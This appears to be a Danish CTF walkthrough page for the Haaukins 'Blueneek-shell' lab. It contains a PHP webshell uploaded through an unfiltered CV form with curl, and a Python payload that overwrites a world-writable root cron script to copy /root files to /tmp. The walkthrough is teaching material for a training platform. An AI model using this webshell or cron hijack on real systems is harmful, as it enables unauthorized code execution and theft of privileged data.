@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Blueneek-shell, tutorial (upload-RCE til root via en skrivbar cron)</title>
+<meta name="description" content="Guide til Haaukins Blueneek-shell: en ufiltreret CV-upload giver en PHP-webshell som www-data, og et world-writable root-cron-script giver resten af vejen til root.">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/blueneek-shell.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: Blueneek-shell, tutorial (upload-RCE til root via en skrivbar cron)">
+<meta property="og:description" content="Guide til Haaukins Blueneek-shell: en ufiltreret CV-upload giver en PHP-webshell som www-data, og et world-writable root-cron-script giver resten af vejen til root.">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/blueneek-shell.html">
+<meta property="og:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Blueneek-shell", "description": "Guide til Haaukins Blueneek-shell: en ufiltreret CV-upload giver en PHP-webshell som www-data, og et world-writable root-cron-script giver resten af vejen til root.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/blueneek-shell.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+<script src="assets/gloss.js" defer></script>
+<script src="assets/hire-widget.js" defer></script>
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Blueneek-shell</h1>
+<p class="subtitle">To separate fejl, hver for sig nok til at give adgang det næste trin.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik. Læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
+<h2>Sporet: en upload-formular uden filtrering</h2>
+<p><code>blueneek.hkn</code> er en statisk Bootstrap-side (nginx/1.10.3). Dirbusting
+finder <code>upload.php</code> og en <code>uploads/</code>-mappe, og <code>apply.html</code> har
+en "Upload your CV"-formular der POST'er til <code>upload.php</code> (feltnavn
+<code>fileToUpload</code>). Opgavens eget hint, "poorly configured nginx+php", peger direkte på at
+PHP-eksekvering i en upload-mappe er den tiltænkte svaghed.</p>
+             <p>Testet: formularen filtrerer ikke filtypen. En uploadet <code>.php</code>-fil ligger
+derefter tilgængelig OG eksekverbar direkte under <code>uploads/</code>:</p>
+             <pre><code>printf '&lt;?php system($_GET["c"]); ?&gt;' > sh.php
+curl --resolve blueneek.hkn:80:&lt;IP&gt; http://blueneek.hkn/upload.php \
+  -F fullname=x -F email=a@b.c -F platform=PHP -F submit=Submit -F fileToUpload=@sh.php
+curl ".../uploads/sh.php?c=id"
+# uid=33(www-data)</code></pre>
+<h2>Fra www-data til root: en root-cron med et skrivbart script</h2>
+<p>www-data er et lavt privilegium, så næste skridt er den samme type tjek som
+altid efter et foothold: hvad kører som root automatisk? Enumerering viser en Ubuntu-container
+(kernel 5.15), standard SUID-binære, sudo 1.8.16 (teoretisk CVE-2021-3156, men ingen
+<code>gcc</code> på target gør den vej besværlig), og mere interessant, en cron-entry:</p>
+             <pre><code>cat /etc/cron.d/server-status
+# */1 * * * * python3 /var/www/scripts/uptime.py >> /var/log/cron.log 2>&amp;1
+ls -la /var/www/scripts/uptime.py
+# -rw-rw-rw-  (www-data kan SKRIVE til scriptet)</code></pre>
+             <p>Scriptet køres som root hvert minut af cron, og www-data (vores webshell-bruger) kan
+overskrive det. Det er den samme logik som en skrivbar root-cron altid giver: du behøver ikke
+læse scriptet, kun kunne erstatte det, for at din kode kører som root ved næste tick.</p>
+             <pre><code>import os
+os.system("cat /root/* > /tmp/c_root 2>/dev/null; chmod 777 /tmp/c_root")</code></pre>
+             <p>Push den payload ind via webshellen (base64-kodet for at undgå escaping-problemer i
+query-strengen), vent op til 60 sekunder på næste cron-tick, og læs resultatet:</p>
+             <pre><code># efter ~60s:
+cat /tmp/c_root
+cat /root/flag.txt</code></pre>
+             <p>Ryd altid op bagefter: gendan den originale <code>uptime.py</code>, og fjern
+webshellen (<code>uploads/sh.php</code>) og <code>/tmp</code>-dropningerne.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag (per-instans): <span class="flag">HKN{vr-TL5-ujh4o}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>En upload-formular uden filtype-filtrering i en mappe hvor PHP eksekveres, er en direkte RCE, ikke kun et informationslæk.</li><li>Et world-writable script som root-cron kører, giver privesc uanset om du kan LÆSE det, en skrive-rettighed er nok.</li><li>Når et canned exploit (her: sudo 1.8.16/Baron Samedit) kræver værktøjer der ikke findes på target (gcc), så led efter en simplere, allerede-synlig vej først.</li><li>Ryd op efter dig: gendan overskrevne filer og slet efterladte webshells.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>Kæden her (web-RCE giver et lavprivilegeret foothold, derefter en separat,
+urelateret fejl giver selve privesc'en) er det almindelige mønster i boot2root-opgaver, de to
+halvdele er sjældent samme sårbarhedsklasse. Se også <a href="cron-my-tab.html">Cron My Tab</a>
+for præcis samme privesc-mekanisme (skrivbart root-cron-script) uden upload-delen, det er værd at
+genkende mønstret uafhængigt af hvordan man først fik fodfæste.</p>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
+er en dansk undervisningsplatform til sikkerhedstræning (AAU, De Danske Cybermesterskaber). Alle opgaver
+løses på platformens egne, formålsbyggede lab-miljøer, aldrig på andres systemer. Guiden forudsætter du selv
+har autoriseret adgang (fx som studerende eller deltager) og er løsningsstøtte til at lære metoden, ikke en
+genvej uden om selv at forstå den.
+</footer>
+</div>
+<aside id="hire-widget">
+<button class="hw-close" type="button" aria-label="Luk">×</button>
+<p>👋 Håber det her hjalp!</p>
+<p>For langhåret til dig? Overvej at ansætte ham der skrev det.</p>
+<a class="hw-link" href="https://www.linkedin.com/in/alexandermangaard/en" target="_blank" rel="noopener">LinkedIn →</a>
+</aside>
+</body>
+</html>
